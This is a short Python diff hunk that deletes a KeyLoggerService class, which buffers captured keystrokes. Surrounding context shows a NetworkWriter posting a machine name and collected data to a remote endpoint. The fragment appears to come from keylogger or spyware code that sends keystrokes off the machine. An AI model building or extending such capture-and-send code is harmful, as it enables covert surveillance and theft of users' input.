@@ -19,21 +19,6 @@ class NetworkWriter(IWriter):
         payload = {"machine": machine_name, "data": data}
         requests.post(self.endpoint, json=payload)
 
-# שירות איסוף הקשות
-class KeyLoggerService:
-    def __init__(self):
-        self._buffer = []
-
-    def log_key(self, key: str):
-        self._buffer.append(key)
-
-    def get_logged_keys(self):
-        keys = self._buffer.copy()
-        self._buffer.clear()
-        return keys
-
-
-
 
 
 
